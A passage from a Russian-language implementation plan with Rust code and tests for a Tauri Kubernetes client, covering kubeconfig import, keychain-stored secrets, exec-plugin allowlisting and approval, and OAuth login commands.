        );
        assert_eq!(
            kind.profile.ca,
            CaConfig::Pem {
                pem: TEST_CERT_PEM.into()
            },
            "CA из файла по пути"
        );

        assert_eq!(get("no-user").unwrap().profile.auth, AuthConfig::Browser);
        let oidc = get("corp-oidc").unwrap();
        let AuthConfig::Exec(e) = &oidc.profile.auth else {
            panic!("exec")
        };
        assert!(e.command.ends_with("kubelogin"));
        assert!(oidc.token.is_none() && oidc.client_key.is_none());
        assert_eq!(get("evil").unwrap_err().key, "errors.exec.notAllowed");
    }

    #[test]
    fn existing_profile_keeps_its_id_and_bad_data_is_an_error() {
        let dir = tempfile::tempdir().unwrap();
        let k = kc(&sample(dir.path()));
        let mut existing = sample_profile("old");
        existing.name = "lab".into();
        existing.api_url = "https://api.lab:6443".into();
        let p = preview(&k, dir.path(), &[existing], &open(), &installed);
        let lab = p.contexts.iter().find(|c| c.name == "lab").unwrap();
        assert_eq!(import_context(&k, "lab", lab).unwrap().profile.id, "old");

        let bad = kc(r#"
clusters:
- name: c
  cluster: {server: "https://api.c:6443", certificate-authority-data: "%%%"}
users:
- name: u
  user: {token: t}
contexts:
- name: x
  context: {cluster: c, user: u}
"#);
        let p = preview(&bad, dir.path(), &[], &open(), &installed);
        assert_eq!(
            import_context(&bad, "x", &p.contexts[0]).unwrap_err().key,
            "errors.kubeconfig.badBase64"
        );
    }

    #[test]
    fn unreadable_file_is_an_input_error() {
        let e = read(Path::new("/no/such/kubeconfig")).unwrap_err();
        assert_eq!(e.key, "errors.kubeconfig.unreadable");
    }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 11.1`.

- [ ] **Step 2: Реализация.**

<!-- block: file t11-src-tauri-src-k8s-kubeconfig-rs-impl step=11.2 path=src-tauri/src/k8s/kubeconfig.rs part=impl -->
````rust
//! Импорт контекстов kubeconfig (спец. §5.5). Данные копируются в момент импорта: токены и
//! ключи — в keychain, CA, сертификат и строка запуска exec-плагина — в профиль; связи с файлом нет.

use std::path::{Path, PathBuf};

use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use kube::config::{AuthInfo, Cluster, ExecConfig, ExecInteractiveMode, Kubeconfig};
use secrecy::ExposeSecret;
use serde::Serialize;

use crate::error::{AppError, AppResult, ErrorCode};
use crate::i18n::LocalizedText;
use crate::policy::PolicyStatus;
use crate::storage::profile::{
    AuthConfig, CaConfig, ConnectionProfile, EXEC_API_V1, EXEC_API_V1BETA1, Environment, ExecAuth,
    ExecEnv, ProxyConfig, is_valid_namespace, normalize_profile, pem_certificates,
};

/// Поиск команды exec-плагина: имя из kubeconfig и каталог файла → абсолютный путь.
pub type ResolveCommand<'a> = &'a dyn Fn(&str, Option<&Path>) -> Option<PathBuf>;

/// Как подключение будет входить после импорта.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum ImportAuth {
    Token,
    ClientCert,
    /// Учётных данных в файле нет (или логин и пароль): вход через браузер.
    Browser,
    /// Exec-плагин из списка разрешённых (спец. §5.2).
    Exec,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct KubeContext {
    pub name: String,
    pub cluster: String,
    pub server: String,
    pub user: String,
    pub namespace: Option<String>,
    pub auth: ImportAuth,
    pub insecure: bool,
    pub current: bool,
    /// Строка запуска exec-плагина с абсолютным путём к команде — человек подтверждает её
    /// при импорте.
    pub exec: Option<ExecAuth>,
    /// Почему контекст нельзя импортировать; `None` — можно.
    pub unsupported: Option<LocalizedText>,
    /// Подключение с тем же адресом и именем: импорт обновит его.
    pub existing_id: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct KubeconfigPreview {
    pub path: String,
    pub contexts: Vec<KubeContext>,
}

/// Подключение из контекста и его секреты.
#[derive(Debug, Clone)]
pub struct ImportedContext {
    pub profile: ConnectionProfile,
    pub token: Option<String>,
    pub client_key: Option<String>,
}

/// Файл по умолчанию: первый путь из `$KUBECONFIG`, иначе `~/.kube/config`.
pub fn default_path(env: crate::k8s::config::EnvLookup, home: Option<PathBuf>) -> Option<PathBuf> {
    if let Some(list) = env("KUBECONFIG").filter(|v| !v.trim().is_empty()) {
        return std::env::split_paths(&list).next();
    }
    home.map(|h| h.join(".kube").join("config"))
}

pub fn read(path: &Path) -> AppResult<Kubeconfig> {
    Kubeconfig::read_from(path).map_err(|e| {
        app_err!(
            ErrorCode::InvalidInput,
            "errors.kubeconfig.unreadable",
            "Cannot read kubeconfig {{path}}: {{error}}",
            path = path.display(),
            error = e
        )
    })
}

fn cluster<'a>(kc: &'a Kubeconfig, name: &str) -> Option<&'a Cluster> {
    kc.clusters
        .iter()
        .find(|c| c.name == name)
        .and_then(|c| c.cluster.as_ref())
}

fn user<'a>(kc: &'a Kubeconfig, name: &str) -> Option<&'a AuthInfo> {
    kc.auth_infos
        .iter()
        .find(|u| u.name == name)
        .and_then(|u| u.auth_info.as_ref())
}

/// Exec-плагин из kubeconfig: команда из списка разрешённых, найденная по абсолютному пути.
fn exec_auth(
    exec: &ExecConfig,
    base: Option<&Path>,
    resolve: ResolveCommand,
) -> Result<ExecAuth, LocalizedText> {
    if exec.interactive_mode == Some(ExecInteractiveMode::Always) {
        return Err(ltext!(
            "errors.kubeconfig.execInteractive",
            "The exec plugin needs a terminal (interactiveMode: Always) — not supported"
        ));
    }
    let command = exec.command.clone().unwrap_or_default();
    let args = exec.args.clone().unwrap_or_default();
    crate::auth::exec::check_allowed(&command, &args)?;
    let api_version = exec
        .api_version
        .clone()
        .unwrap_or_else(|| EXEC_API_V1.to_string());
    if api_version != EXEC_API_V1 && api_version != EXEC_API_V1BETA1 {
        return Err(ltext!(
            "errors.exec.badApiVersion",
            "Unsupported exec plugin API version “{{version}}”: use {{expected}}",
            version = api_version,
            expected = EXEC_API_V1
        ));
    }
    let path = resolve(&command, base).ok_or_else(|| {
        ltext!(
            "errors.kubeconfig.execNotFound",
            "Command “{{command}}” is not found in PATH or the standard folders — install it or specify the full path in kubeconfig",
            command = command
        )
    })?;
    let env = exec
        .env
        .iter()
        .flatten()
        .filter_map(|m| {
            Some(ExecEnv {
                name: m.get("name")?.clone(),
                value: m.get("value").cloned().unwrap_or_default(),
            })
        })
        .collect();
    Ok(ExecAuth {
        command: path.display().to_string(),
        args,
        env,
        api_version,
        provide_cluster_info: exec.provide_cluster_info,
        approved: None,
    })
}

/// Способ входа, строка запуска exec-плагина и причина, по которой контекст не импортируется.
fn classify(
    u: Option<&AuthInfo>,
    base: Option<&Path>,
    resolve: ResolveCommand,
) -> (ImportAuth, Option<ExecAuth>, Option<LocalizedText>) {
    let Some(u) = u else {
        return (ImportAuth::Browser, None, None);
    };
    if let Some(exec) = &u.exec {
        return match exec_auth(exec, base, resolve) {
            Ok(e) => (ImportAuth::Exec, Some(e), None),
            Err(reason) => (ImportAuth::Exec, None, Some(reason)),
        };
    }
    if let Some(p) = &u.auth_provider {
        return (
            ImportAuth::Browser,
            None,
            Some(ltext!(
                "errors.kubeconfig.authProvider",
                "Authentication provider “{{name}}” is outdated and not supported — use an exec plugin",
                name = p.name
            )),
        );
    }
    if u.token.is_some() || u.token_file.is_some() {
        return (ImportAuth::Token, None, None);
    }
    if u.client_certificate.is_some() || u.client_certificate_data.is_some() {
        return (ImportAuth::ClientCert, None, None);
    }
    (ImportAuth::Browser, None, None)
}

/// Контексты файла для предпросмотра. `existing` — уже сохранённые подключения, `resolve` ищет
/// команды exec-плагинов.
pub fn preview(
    kc: &Kubeconfig,
    path: &Path,
    existing: &[ConnectionProfile],
    policy: &PolicyStatus,
    resolve: ResolveCommand,
) -> KubeconfigPreview {
    let contexts = kc
        .contexts
        .iter()
        .map(|nc| {
            let ctx = nc.context.clone().unwrap_or_default();
            let user_name = ctx.user.clone().unwrap_or_default();
            let cl = cluster(kc, &ctx.cluster);
            let server = cl
                .and_then(|c| c.server.clone())
                .unwrap_or_default()
                .trim_end_matches('/')
                .to_string();
            let insecure = cl.and_then(|c| c.insecure_skip_tls_verify).unwrap_or(false);
            let (auth, exec, mut unsupported) = classify(user(kc, &user_name), path.parent(), resolve);
            if cl.is_none() {
                unsupported = Some(ltext!(
                    "errors.kubeconfig.noCluster",
                    "The context refers to a missing cluster “{{name}}”",
                    name = ctx.cluster
                ));
            } else if insecure && !policy.allow_insecure_tls {
                unsupported = Some(ltext!(
                    "errors.connections.insecureForbidden",
                    "Connections without TLS certificate verification are forbidden by your organization"
                ));
            } else if auth == ImportAuth::Exec && !policy.allow_exec_auth {
                unsupported = Some(ltext!(
                    "errors.connections.execForbidden",
                    "Connections with exec plugins are forbidden by your organization"
                ));
            }
            KubeContext {
                existing_id: existing
                    .iter()
                    .find(|p| p.name == nc.name && p.api_url == server)
                    .map(|p| p.id.clone()),
                name: nc.name.clone(),
                cluster: ctx.cluster.clone(),
                server,
                user: user_name,
                namespace: ctx.namespace.clone(),
                auth,
                insecure,
                current: kc.current_context.as_deref() == Some(nc.name.as_str()),
                exec,
                unsupported,
            }
        })
        .collect();
    KubeconfigPreview {
        path: path.display().to_string(),
        contexts,
    }
}

fn file_text(path: &str) -> AppResult<String> {
    std::fs::read_to_string(path).map_err(|e| {
        app_err!(
            ErrorCode::InvalidInput,
            "errors.kubeconfig.fileUnreadable",
            "Cannot read {{path}} referenced by kubeconfig: {{error}}",
            path = path,
            error = e
        )
    })
}

fn decoded(data: &str) -> AppResult<String> {
    STANDARD
        .decode(data.trim())
        .ok()
        .and_then(|b| String::from_utf8(b).ok())
        .ok_or_else(|| {
            app_err!(
                ErrorCode::InvalidInput,
                "errors.kubeconfig.badBase64",
                "Certificate or key data in kubeconfig is not valid base64"
            )
        })
}

/// Данные из `*-data` (base64) или из файла по пути.
fn data_or_file(data: Option<&str>, path: Option<&str>) -> AppResult<Option<String>> {
    match (data, path) {
        (Some(d), _) => decoded(d).map(Some),
        (None, Some(p)) => file_text(p).map(Some),
        (None, None) => Ok(None),
    }
}

/// Подключение из контекста `name`. Ошибка — если контекст не поддерживается или данные
/// не читаются.
pub fn import_context(
    kc: &Kubeconfig,
    name: &str,
    preview: &KubeContext,
) -> AppResult<ImportedContext> {
    if let Some(reason) = &preview.unsupported {
        return Err(AppError::localized(ErrorCode::InvalidInput, reason.clone()));
    }
    let nc = kc.contexts.iter().find(|c| c.name == name).ok_or_else(|| {
        app_err!(
            ErrorCode::NotFound,
            "errors.kubeconfig.noContext",
            "Context “{{name}}” not found in kubeconfig",
            name = name
        )
    })?;
    let ctx = nc.context.clone().unwrap_or_default();
    let cl = cluster(kc, &ctx.cluster).cloned().unwrap_or_default();
    let u = ctx.user.as_deref().and_then(|n| user(kc, n));

    let ca = if cl.insecure_skip_tls_verify.unwrap_or(false) {
        CaConfig::Insecure
    } else {
        match data_or_file(
            cl.certificate_authority_data.as_deref(),
            cl.certificate_authority.as_deref(),
        )? {
            Some(pem) => {
                pem_certificates(&pem).map_err(|_| {
                    app_err!(
                        ErrorCode::InvalidInput,
                        "errors.connections.caPemInvalid",
                        "The CA certificate must be in PEM format (-----BEGIN CERTIFICATE-----)"
                    )
                })?;
                CaConfig::Pem { pem }
            }
            None => CaConfig::System,
        }
    };
    let mut token = None;
    let mut client_key = None;
    let auth = match preview.auth {
        ImportAuth::Token => {
            let u = u.expect("token auth has a user");
            token = Some(match (&u.token, &u.token_file) {
                (Some(t), _) => t.expose_secret().trim().to_string(),
                (None, Some(f)) => file_text(f)?.trim().to_string(),
                (None, None) => String::new(),
            });
            AuthConfig::Token
        }
        ImportAuth::ClientCert => {
            let u = u.expect("cert auth has a user");
            let cert = data_or_file(
                u.client_certificate_data.as_deref(),
                u.client_certificate.as_deref(),
            )?
            .unwrap_or_default();
            client_key = data_or_file(
                u.client_key_data.as_ref().map(|k| k.expose_secret()),
                u.client_key.as_deref(),
            )?;
            AuthConfig::ClientCert {
                certificate_pem: cert,
            }
        }
        ImportAuth::Browser => AuthConfig::Browser,
        ImportAuth::Exec => AuthConfig::Exec(
            preview
                .exec
                .clone()
                .ok_or_else(|| AppError::internal_with("exec context without a launch line"))?,
        ),
    };
    let mut profile = ConnectionProfile {
        id: preview
            .existing_id
            .clone()
            .unwrap_or_else(|| uuid::Uuid::new_v4().to_string()),
        name: nc.name.clone(),
        color: "#3b82f6".into(),
        environment: Environment::Dev,
        read_only: false,
        api_url: cl.server.clone().unwrap_or_default(),
        auth,
        ca,
        tls_server_name: cl.tls_server_name.clone(),
        proxy: match cl.proxy_url.as_deref().map(str::trim) {
            Some(u) if !u.is_empty() => ProxyConfig::Url { url: u.to_string() },
            _ => ProxyConfig::System,
        },
        favorite_namespaces: ctx
            .namespace
            .clone()
            .filter(|n| is_valid_namespace(n))
            .into_iter()
            .collect(),
        manual_namespaces: Vec::new(),
        request_timeout_ms: 30_000,
        connect_timeout_ms: 10_000,
        folder_id: None,
        order: 0,
        extra: Default::default(),
    };
    normalize_profile(&mut profile);
    crate::storage::profile::validate_profile(&profile)?;
    Ok(ImportedContext {
        profile,
        token,
        client_key,
    })
}
````

<!-- block: patch t11-src step=11.2 -->
````diff
diff --git a/src-tauri/src/k8s/mod.rs b/src-tauri/src/k8s/mod.rs
--- a/src-tauri/src/k8s/mod.rs
+++ b/src-tauri/src/k8s/mod.rs
@@ -4,6 +4,7 @@ pub mod cluster;
 pub mod config;
 pub mod connectivity;
 pub mod errors;
+pub mod kubeconfig;
 pub mod pool;
 #[cfg(test)]
 pub(crate) mod testing;
````

Применить: `python3 /tmp/o1a-blocks.py step 11.2`.

- [ ] **Step 3: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 172 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

- [ ] **Step 4: Commit.**

```bash
git add -A
git commit -s -m "feat(k8s): импорт контекстов kubeconfig — токены, сертификаты, exec-плагины, CA, прокси, проекты" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 12: Команды Tauri: подключения, проверка, вход, exec-плагины, импорт kubeconfig

**Files:**
- Create: `src-tauri/src/commands/auth.rs`, `src-tauri/src/commands/connections.rs`, `src-tauri/src/commands/kubeconfig.rs`
- Modify: `src-tauri/src/commands/mod.rs`, `src-tauri/src/lib.rs`

**Interfaces:**
- Consumes: задачи 3–11.
- Produces: `commands::connections::{SecretsInput { token, client_key }, ConnectionInput { profile, secrets, confirm_exec }, save_connection_blocking, set_token_blocking}`; команды `list_connections`, `save_connection(input)`, `delete_connection(id)`, `test_connection(input)`, `connect(connectionId, fresh)`, `disconnect(connectionId)`, `set_connection_token(connectionId, token)`, `start_oauth_login(connectionId)`, `cancel_oauth_login(connectionId)`, `oauth_token_page(connectionId)`, `resolve_exec_command(command) -> String`, `preview_kubeconfig_import(path?)`, `apply_kubeconfig_import(path, contexts, folderId?, approveExec)`.

Спец. §4.2. `save_connection` сохраняет профиль и секреты согласованно (откат профиля, если keychain не принял секрет) и удаляет секреты, которые способ входа не использует; подтверждение строки запуска exec-плагина принимается только флагом `confirmExec` из формы — поле `approved` из самого профиля игнорируется, без флага остаётся прежнее (и с изменённой строкой уже не совпадает). `test_connection` накладывает секреты формы поверх keychain, учитывает `confirmExec` и регистрирует ожидание плагина в `Logins`; `connect` подключается из пула или заново (`fresh`); вход через браузер открывает страницу системным браузером (`tauri-plugin-opener`), сохраняет токен и подключается заново; `cancel_oauth_login` отменяет и вход через браузер, и ожидание exec-плагина. Новая команда `resolve_exec_command` (уточнение спеки) — кнопка «Найти» в форме. Импорт kubeconfig ищет команды exec-плагинов в каталогах этой машины, подтверждает строку запуска только у контекстов из `approveExec` и обновляет совпавшие подключения, сохраняя их имя, окружение, цвет, «только чтение» и место в дереве.

- [ ] **Step 1: Тесты.**

<!-- block: file t12-src-tauri-src-commands-connections-rs-tests step=12.1 path=src-tauri/src/commands/connections.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;
    use crate::error::{AppError, ErrorCode};
    use crate::secrets::MemoryStore;
    use crate::storage::profile::{CaConfig, TEST_CERT_PEM, sample_profile};

    fn state(dir: &std::path::Path) -> AppState {
        AppState::new(dir, Arc::new(MemoryStore::default())).unwrap()
    }

    fn input(
        profile: ConnectionProfile,
        token: Option<&str>,
        key: Option<&str>,
    ) -> ConnectionInput {
        ConnectionInput {
            profile,
            secrets: SecretsInput {
                token: token.map(String::from),
                client_key: key.map(String::from),
            },
            confirm_exec: false,
        }
    }

    fn secret(st: &AppState, id: &str, field: &str) -> Option<String> {
        st.secrets.get(&secret_key(id, field)).unwrap()
    }

    #[test]
    fn secret_ops_matrix() {
        let token = sample_profile("a");
        let s = |t: Option<&str>, k: Option<&str>| SecretsInput {
            token: t.map(String::from),
            client_key: k.map(String::from),
        };
        assert_eq!(
            secret_ops(&token, &s(None, Some("k"))),
            [(TOKEN, SecretOp::Keep), (CLIENT_KEY, SecretOp::Delete)]
        );
        assert_eq!(
            secret_ops(&token, &s(Some(" t "), None))[0],
            (TOKEN, SecretOp::Set("t".into()))
        );
        assert_eq!(
            secret_ops(&token, &s(Some(""), None))[0],
            (TOKEN, SecretOp::Delete)
        );
        let mut cert = sample_profile("a");
        cert.auth = AuthConfig::ClientCert {
            certificate_pem: TEST_CERT_PEM.into(),
        };
        assert_eq!(
            secret_ops(&cert, &s(Some("t"), Some("KEY"))),
            [
                (TOKEN, SecretOp::Delete),
                (CLIENT_KEY, SecretOp::Set("KEY".into()))
            ]
        );
    }

    #[test]
    fn save_assigns_id_stores_secrets_and_switches_method() {
        let dir = tempfile::tempdir().unwrap();
        let st = state(dir.path());
        let mut p = sample_profile("");
        p.id = String::new();
        let saved = save_connection_blocking(&st, input(p, Some("sha256~t"), None)).unwrap();
        assert!(!saved.id.is_empty());
        assert_eq!(secret(&st, &saved.id, TOKEN).as_deref(), Some("sha256~t"));
        // Повторное сохранение без токена оставляет сохранённый.
        save_connection_blocking(&st, input(saved.clone(), None, None)).unwrap();
        assert_eq!(secret(&st, &saved.id, TOKEN).as_deref(), Some("sha256~t"));
        // Переход на сертификат удаляет токен.
        let mut cert = saved.clone();
        cert.auth = AuthConfig::ClientCert {
            certificate_pem: TEST_CERT_PEM.into(),
        };
        save_connection_blocking(&st, input(cert, None, Some("KEY"))).unwrap();
        assert_eq!(secret(&st, &saved.id, TOKEN), None);
        assert_eq!(secret(&st, &saved.id, CLIENT_KEY).as_deref(), Some("KEY"));
    }

    #[test]
    fn invalid_profile_touches_no_secret_and_policy_blocks_insecure() {
        let dir = tempfile::tempdir().unwrap();
        let mut policy = crate::policy::Policy::default();
        policy.status.allow_insecure_tls = false;
        let st = state(dir.path()).with_policy(policy);
        let mut p = sample_profile("a");
        p.ca = CaConfig::Insecure;
        let e = save_connection_blocking(&st, input(p, Some("t"), None)).unwrap_err();
        assert_eq!(e.key, "errors.connections.insecureForbidden");
        let mut p = sample_profile("a");
        p.name = " ".into();
        assert_eq!(
            save_connection_blocking(&st, input(p, Some("t"), None))
                .unwrap_err()
                .code,
            ErrorCode::InvalidInput
        );
        assert_eq!(secret(&st, "a", TOKEN), None);
        assert!(st.connections.list().is_empty());
    }

    #[test]
    fn exec_approval_comes_only_from_the_form() {
        let dir = tempfile::tempdir().unwrap();
        let st = state(dir.path());
        let mut p = sample_profile("e");
        let mut forged = crate::storage::profile::sample_exec();
        forged.approved = Some(crate::auth::exec::fingerprint(&forged));
        p.auth = AuthConfig::Exec(forged);
        let approved = |p: &ConnectionProfile| match &p.auth {
            AuthConfig::Exec(e) => crate::auth::exec::is_approved(e),
            _ => false,
        };
        // Подтверждение, пришедшее в самом профиле, не принимается.
        let saved = save_connection_blocking(&st, input(p.clone(), None, None)).unwrap();
        assert!(!approved(&saved));
        let mut i = input(saved.clone(), None, None);
        i.confirm_exec = true;
        let saved = save_connection_blocking(&st, i).unwrap();
        assert!(approved(&saved));
        // Повторное сохранение той же строки подтверждение сохраняет, изменённой — нет.
        assert!(approved(
            &save_connection_blocking(&st, input(saved.clone(), None, None)).unwrap()
        ));
        let mut changed = saved;
        if let AuthConfig::Exec(e) = &mut changed.auth {
            e.args.push("--v=8".into());
        }
        assert!(!approved(
            &save_connection_blocking(&st, input(changed, None, None)).unwrap()
        ));
        // Политика запрещает exec-плагины.
        let mut policy = crate::policy::Policy::default();
        policy.status.allow_exec_auth = false;
        let st = state(dir.path()).with_policy(policy);
        assert_eq!(
            save_connection_blocking(&st, input(p, None, None))
                .unwrap_err()
                .key,
            "errors.connections.execForbidden"
        );
    }

    struct FailingStore;
    impl SecretStore for FailingStore {
        fn get(&self, _: &str) -> AppResult<Option<String>> {
            Ok(None)
        }
        fn set(&self, _: &str, _: &str) -> AppResult<()> {
            Err(AppError::internal_with("keychain locked"))
        }
        fn delete(&self, _: &str) -> AppResult<()> {
            Ok(())
        }
    }

    #[test]
    fn keychain_failure_rolls_back_new_profile() {
        let dir = tempfile::tempdir().unwrap();
        let st = AppState::new(dir.path(), Arc::new(FailingStore)).unwrap();
        let e = save_connection_blocking(&st, input(sample_profile("a"), Some("t"), None));
        assert!(e.is_err());
        assert!(
            st.connections.list().is_empty(),
            "профиль без секрета не остался"
        );
    }

    #[test]
    fn token_can_be_replaced_only_for_token_methods() {
        let dir = tempfile::tempdir().unwrap();
        let st = state(dir.path());
        st.connections.upsert(sample_profile("a")).unwrap();
        set_token_blocking(&st, "a", " sha256~new ").unwrap();
        assert_eq!(secret(&st, "a", TOKEN).as_deref(), Some("sha256~new"));
        let mut cert = sample_profile("c");
        cert.auth = AuthConfig::ClientCert {
            certificate_pem: TEST_CERT_PEM.into(),
        };
        st.connections.upsert(cert).unwrap();
        assert_eq!(
            set_token_blocking(&st, "c", "t").unwrap_err().key,
            "errors.connections.tokenNotUsed"
        );
    }
}
````

<!-- block: file t12-src-tauri-src-commands-kubeconfig-rs-tests step=12.1 path=src-tauri/src/commands/kubeconfig.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use std::sync::Arc;

    use super::*;
    use crate::secrets::{MemoryStore, TOKEN, secret_key};
    use crate::storage::profile::{AuthConfig, Environment, TEST_CERT_PEM};

    fn apply(
        st: &AppState,
        path: &Path,
        names: &[&str],
        folder_id: Option<String>,
        approve_exec: &[&str],
        dirs: &[PathBuf],
    ) -> AppResult<Vec<ConnectionProfile>> {
        let names: Vec<String> = names.iter().map(|s| s.to_string()).collect();
        let approve: Vec<String> = approve_exec.iter().map(|s| s.to_string()).collect();
        let request = ApplyRequest {
            path,
            names: &names,
            folder_id,
            approve_exec: &approve,
            dirs,
        };
        apply_blocking(st, request)
    }

    fn write_kubeconfig(dir: &Path) -> PathBuf {
        use base64::Engine;
        let ca = base64::engine::general_purpose::STANDARD.encode(TEST_CERT_PEM);
        let path = dir.join("config");
        std::fs::write(
            &path,
            format!(
                r#"
clusters:
- name: dev
  cluster: {{server: "https://api.dev:6443", certificate-authority-data: "{ca}"}}
users:
- name: alice
  user: {{token: sha256~alice}}
- name: oidc
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kubelogin
      args: [get-token, --oidc-issuer-url=https://sso.corp]
contexts:
- name: dev-alice
  context: {{cluster: dev, user: alice, namespace: team-a}}
- name: dev-browser
  context: {{cluster: dev}}
- name: dev-oidc
  context: {{cluster: dev, user: oidc}}
"#
            ),
        )
        .unwrap();
        path
    }

    #[test]
    fn import_creates_profiles_in_folder_and_stores_tokens() {
        let dir = tempfile::tempdir().unwrap();
        let st = AppState::new(&dir.path().join("data"), Arc::new(MemoryStore::default())).unwrap();
        let folder = st.connections.create_folder("Kubeconfig", None).unwrap();
        let path = write_kubeconfig(dir.path());
        let p = preview_blocking(&st, &path, &[]).unwrap();
        assert_eq!(p.contexts.len(), 3);
        let saved = apply(
            &st,
            &path,
            &["dev-alice", "dev-browser"],
            Some(folder.id.clone()),
            &[],
            &[],
        )
        .unwrap();
        assert_eq!(saved.len(), 2);
        let alice = &saved[0];
        assert_eq!(alice.folder_id.as_deref(), Some(folder.id.as_str()));
        assert_eq!(
            st.secrets
                .get(&secret_key(&alice.id, TOKEN))
                .unwrap()
                .as_deref(),
            Some("sha256~alice")
        );
        assert_eq!(saved[1].auth, AuthConfig::Browser);
        assert_eq!(
            st.secrets.get(&secret_key(&saved[1].id, TOKEN)).unwrap(),
            None
        );
    }

    #[test]
    fn reimport_updates_existing_profile_keeping_local_choices() {
        let dir = tempfile::tempdir().unwrap();
        let st = AppState::new(&dir.path().join("data"), Arc::new(MemoryStore::default())).unwrap();
        let path = write_kubeconfig(dir.path());
        let first = apply(&st, &path, &["dev-alice"], None, &[], &[]).unwrap();
        let mut local = first[0].clone();
        local.environment = Environment::Prod;
        local.read_only = true;
        local.favorite_namespaces = vec!["ops".into()];
        st.connections.upsert(local).unwrap();

        let again = apply(&st, &path, &["dev-alice"], None, &[], &[]).unwrap();
        assert_eq!(again[0].id, first[0].id);
        assert_eq!(again[0].environment, Environment::Prod);
        assert!(again[0].read_only);
        assert_eq!(again[0].favorite_namespaces, vec!["ops", "team-a"]);
        assert_eq!(st.connections.list().len(), 1);
    }

    #[test]
    fn unknown_context_is_not_found() {
        let dir = tempfile::tempdir().unwrap();
        let st = AppState::new(&dir.path().join("data"), Arc::new(MemoryStore::default())).unwrap();
        let path = write_kubeconfig(dir.path());
        let e = apply(&st, &path, &["nope"], None, &[], &[]).unwrap_err();
        assert_eq!(e.key, "errors.kubeconfig.noContext");
    }

    #[test]
    fn exec_context_is_approved_only_when_confirmed() {
        let dir = tempfile::tempdir().unwrap();
        let st = AppState::new(&dir.path().join("data"), Arc::new(MemoryStore::default())).unwrap();
        let path = write_kubeconfig(dir.path());
        let bin = dir.path().join("bin");
        std::fs::create_dir(&bin).unwrap();
        std::fs::write(bin.join("kubelogin"), "").unwrap();
        let dirs = [bin.clone()];
        let p = preview_blocking(&st, &path, &dirs).unwrap();
        let oidc = p.contexts.iter().find(|c| c.name == "dev-oidc").unwrap();
        assert_eq!(
            oidc.exec.as_ref().unwrap().command,
            bin.join("kubelogin").display().to_string()
        );
        let approved = |p: &ConnectionProfile| match &p.auth {
            AuthConfig::Exec(e) => crate::auth::exec::is_approved(e),
            _ => false,
        };
        let saved = apply(&st, &path, &["dev-oidc"], None, &[], &dirs).unwrap();
        assert!(!approved(&saved[0]), "без согласия в диалоге");
        let saved = apply(&st, &path, &["dev-oidc"], None, &["dev-oidc"], &dirs).unwrap();
        assert!(approved(&saved[0]));
        // Без команды на машине контекст не импортируется.
        let e = apply(&st, &path, &["dev-oidc"], None, &["dev-oidc"], &[]).unwrap_err();
        assert_eq!(e.key, "errors.kubeconfig.execNotFound");
    }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 12.1`.

- [ ] **Step 2: Реализация.**

<!-- block: file t12-src-tauri-src-commands-auth-rs step=12.2 path=src-tauri/src/commands/auth.rs -->
````rust
use tauri::State;
use tauri_plugin_opener::OpenerExt;

use super::blocking;
use crate::auth::oauth::{self, LOGIN_TIMEOUT};
use crate::error::{AppResult, ErrorCode};
use crate::k8s::cluster::ConnectionInfo;
use crate::secrets::{TOKEN, secret_key};
use crate::state::AppState;

/// Вход через браузер: открывает страницу входа OAuth OpenShift, ждёт redirect, сохраняет токен
/// в keychain и подключается заново.
#[tauri::command]
pub async fn start_oauth_login(
    app: tauri::AppHandle,
    state: State<'_, AppState>,
    connection_id: String,
) -> AppResult<ConnectionInfo> {
    let st = state.inner().clone();
    let profile = st.connections.get(&connection_id)?;
    crate::k8s::connectivity::ensure_allowed(&profile, &st.policy.status)?;
    let (n, cancel) = st.logins.begin(&connection_id);
    let open = |url: &str| {
        app.opener().open_url(url, None::<&str>).map_err(|e| {
            app_err!(
                ErrorCode::Internal,
                "errors.oauth.browser",
                "Cannot open the browser: {{error}}",
                error = e
            )
        })
    };
    let result = oauth::login(&profile, open, cancel, LOGIN_TIMEOUT).await;
    st.logins.finish(&connection_id, n);
    let token = result?;
    let (st2, id) = (st.clone(), connection_id.clone());
    blocking(move || st2.secrets.set(&secret_key(&id, TOKEN), &token)).await?;
    let c = st.connected(&connection_id, true).await?;
    Ok(c.info.clone())
}

/// Отменяет вход через браузер или ожидание exec-плагина (подключение и проверка).
#[tauri::command]
pub fn cancel_oauth_login(state: State<'_, AppState>, connection_id: String) -> AppResult<bool> {
    Ok(state.logins.cancel(&connection_id))
}

/// Абсолютный путь к команде exec-плагина — кнопка «Найти» в форме: PATH оболочки входа
/// и стандартные каталоги (спец. §5.2).
#[tauri::command]
pub async fn resolve_exec_command(command: String) -> AppResult<String> {
    let dirs = crate::auth::exec::command_dirs().await;
    crate::auth::exec::resolve_command(&command, None, &dirs, &|p| p.is_file())
        .map(|p| p.display().to_string())
        .ok_or_else(|| {
            app_err!(
                ErrorCode::InvalidInput,
                "errors.exec.commandNotFound",
                "Command “{{command}}” is not found in PATH or the standard folders — specify the full path",
                command = command.trim()
            )
        })
}

/// Адрес страницы «Display Token» кластера — запасной путь, если вход через браузер не работает.
#[tauri::command]
pub async fn oauth_token_page(
    state: State<'_, AppState>,
    connection_id: String,
) -> AppResult<String> {
    let profile = state.connections.get(&connection_id)?;
    let http = oauth::http_client(&profile)?;
    let meta = oauth::fetch_metadata(&http, &profile.api_url).await?;
    Ok(oauth::token_request_page(&meta))
}
````

<!-- block: file t12-src-tauri-src-commands-connections-rs-impl step=12.2 path=src-tauri/src/commands/connections.rs part=impl -->
````rust
use std::collections::HashMap;
use std::sync::Arc;

use serde::Deserialize;
use tauri::State;

use super::blocking;
use crate::error::AppResult;
use crate::k8s::cluster::ConnectionInfo;
